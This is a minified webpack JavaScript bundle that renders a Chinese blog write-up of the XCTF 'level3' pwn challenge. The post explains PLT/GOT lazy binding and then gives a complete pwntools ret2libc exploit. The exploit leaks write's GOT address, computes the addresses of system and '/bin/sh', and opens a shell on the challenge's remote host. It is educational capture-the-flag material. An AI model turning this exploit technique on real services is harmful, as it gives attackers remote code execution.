(window.webpackJsonp=window.webpackJsonp||[]).push([[14],{426:function(t,s,a){"use strict";a.r(s);var n=a(2),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h3",{attrs:{id:"题目"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#题目"}},[t._v("#")]),t._v(" 题目")]),t._v(" "),s("p",[t._v("最近学习了ret2libc，于是找了一道例题来练习："),s("a",{attrs:{href:"https://adworld.xctf.org.cn/challenges/details?hash=49f986c6-2097-4c70-ae7e-d4e5302b7645_2&task_category_id=2",target:"_blank",rel:"noopener noreferrer"}},[t._v("[xctf]level3"),s("OutboundLink")],1)]),t._v(" "),s("p",[t._v("做题第一步，查看基本信息：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548293.png",alt:"1663829372440.png"}})]),t._v(" "),s("p",[t._v("发现只有NX保护和部分只读重定向（RELRO），根据题目提示，可以知道要利用ret2libc技巧\n放入ida反汇编一下："),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548294.png",alt:"1663829568671.png"}})]),t._v(" "),s("p",[t._v("可以发现，程序中已经没有现成的system函数和bin/sh地址了，但难道程序真的就没有他们俩了吗？")]),t._v(" "),s("h3",{attrs:{id:"动态链接"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#动态链接"}},[t._v("#")]),t._v(" 动态链接")]),t._v(" "),s("p",[t._v("实际上，linux采用了动态链接机制，即在程序运行时，当其需要使用时再去系统的动态链接库中调用，其调用过程即为（假设调用的是write函数）：")]),t._v(" "),s("p",[t._v("需要调用write函数--\x3e开始寻找write函数地址(即 call _write@plt）--\x3e plt中没有，于是去.got.plt表中寻找(即 jmp .got.plt(write)) --\x3e 找到write函数在程序中的地址")]),t._v(" "),s("p",[t._v("其中：plt（Procedure Link Table）的是指程序连接表，而got（Global Offset Table）是指全局偏移量表，整个执行过程如图（网上找的）：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548295.jpeg",alt:"PLT和GOT原理雏形"}})]),t._v(" "),s("p",[t._v("但如果这样执行，got表就要把libc中所有函数的地址都保存下来，但其中大部分都是我们不需要的，这样会占用程序大量空间。于是，linux采用了延迟绑定机制，即当需要使用函数时，再去寻找该函数在程序中的位置。")]),t._v(" "),s("h3",{attrs:{id:"延迟绑定"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#延迟绑定"}},[t._v("#")]),t._v(" 延迟绑定")]),t._v(" "),s("p",[t._v("延迟绑定的机制分为两种情况，如果该函数已经被使用过了，那么got表中已经包含了该函数的地址，于是像上述过程进行即可。而如果这个函数还未被调用，则按如下过程进行：")]),t._v(" "),s("p",[t._v("需要调用write函数--\x3e开始寻找write函数地址(即 call _write@plt）--\x3e plt中没有，于是去.got.plt表中寻找(即 jmp .got.plt(write)) --\x3e 由于.got.plt表中没有，于是需要去寻找该write函数的地址")]),t._v(" "),s("p",[t._v("由于这里有点绕，所以单独描述：")]),t._v(" "),s("p",[t._v(".got.plt表中还没有write函数的地址，那存放的是什么呢？我们进入gdb查看一下:\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548296.png",alt:"1663844900507.png"}})]),t._v(" "),s("p",[t._v("可以看到，.got.plt中的write项指向的是write@plt + 6，即write@plt的后半部分。于是，我们可以去IDA看一下write@plt整体是怎么样的：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548297.png",alt:"1663831768169.png"}})]),t._v(" "),s("p",[t._v("可见接下来会执行：")]),t._v(" "),s("div",{staticClass:"language-asm line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("push 18h\njmp sub_8048300\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br")])]),s("p",[t._v("那我们再看看sub_8048300是什么吧：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548298.png",alt:"1663845312296.png"}})]),t._v(" "),s("p",[t._v("由此可见，接下来会跳转到plt表头的一个内容，我们可以称其为公共plt表项。")]),t._v(" "),s("p",[t._v("那这个函数又会怎么运行呢？我们再用动态调试看一下：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548299.png",alt:"1663845796722.png"}})]),t._v(" "),s("p",[t._v("而寻找的过程我们就不用深究了，但我们在其中间过程可以发现这一步：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548300.png",alt:"1663845939789.png"}})]),t._v(" "),s("p",[t._v("执行后我们再查看got表：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548301.png",alt:"1663845996703.png"}})]),t._v(" "),s("p",[t._v("可以看到，write的地址已被写入got表项中了。当我们再次调用write函数的时候，我们就可以直接访问write@plt--\x3ewrite@got.plt--\x3elibc中的write。这样即节省了空间，也使节省了后续运行的时间。")]),t._v(" "),s("h3",{attrs:{id:"wp"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#wp"}},[t._v("#")]),t._v(" WP")]),t._v(" "),s("p",[t._v("看完刚刚的过程后，我们进入ida，可以看到有一个名为vulnerable_function 的函数，从名字就可以看出这是我们要利用的。但当考虑栈溢出时，我们必须要先获得system函数和bin/sh的地址，于是，我们需要先让程序运行一下write（其他函数同理）并输出got表项，再减去got表中write地址的偏移，就可以获得libc的基地址。")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## from LibcSearcher import *")]),t._v("\ncontext"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("log_level"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'debug'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("arch"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'i386'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" os"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'linux'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" \npwnfile"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/image/level3'")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## io = process(pwnfile)")]),t._v("\nio "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" remote"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'61.147.171.105'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("51500")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nelf "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ELF"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pwnfile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nlibc "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ELF"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/image/libc_32.so.6"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\npadding "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x8c")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#通过调试易得")]),t._v("\nleak_func_name "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'write'")]),t._v("   "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#选择write函数来泄露其地址")]),t._v("\nleak_func_got "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("got"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("leak_func_name"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#获取其got表项的地址")]),t._v("\n\nvulfunc_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'vulnerable_function'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("  \nwrite_sys_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'write'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\nmain_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'main'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#利用栈溢出，更改func的返回地址至write函数，并传入参数，执行结果相当于：write（1，write@got,8)")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#main地址是为下一步做准备")]),t._v("\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("b'a'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("padding "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" write_sys_addr "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" main_addr "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" leak_func_got "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" \n\ndelimiter "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Input:\\n"')]),t._v("\nio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendlineafter"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("delimiter"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nwrite_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" u32"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("io"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recv"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"write_addr:"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("write_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br"),s("span",{staticClass:"line-number"},[t._v("22")]),s("br"),s("span",{staticClass:"line-number"},[t._v("23")]),s("br"),s("span",{staticClass:"line-number"},[t._v("24")]),s("br"),s("span",{staticClass:"line-number"},[t._v("25")]),s("br"),s("span",{staticClass:"line-number"},[t._v("26")]),s("br")])]),s("p",[t._v("在获得write函数的地址后，我们便可以轻松确定其他内容的地址。由于题目中给我们附带了libc的文件，所以我们可以直接查找，如果没有的话，我们可以通过libcsearcher查找。")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("write_offset "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"write"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#获取libc中write的偏移")]),t._v("\nlibc_base "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" write_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" write_offset "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#计算libc的基地址")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"libc:"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("libc_base"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nsystem_offset "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"system"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#同理计算system地址")]),t._v("\nsystem_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc_base "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" system_offset\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"system:"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("system_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nbin_sh_offset "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x15902b")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#bin_sh的偏移可以通过string命令查询，也可以用ida反汇编找到")]),t._v("\nbin_sh_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc_base "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" bin_sh_offset\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"bin_sh:"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("bin_sh_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br")])]),s("p",[t._v("最后，因为我们在前面设置了main的返回地址，所以程序在输出write函数地址后会回到main函数，这次再进行栈溢出就可以了：")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('#简单的构造payload\npayload2 = flat (b"a"*padding , system_addr , 0xdeadbeef , bin_sh_addr)\n\nio.sendlineafter(delimiter, payload2)\nio.interactive()\n')])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br")])])])}),[],!1,null,null,null);s.default=e.exports}}]);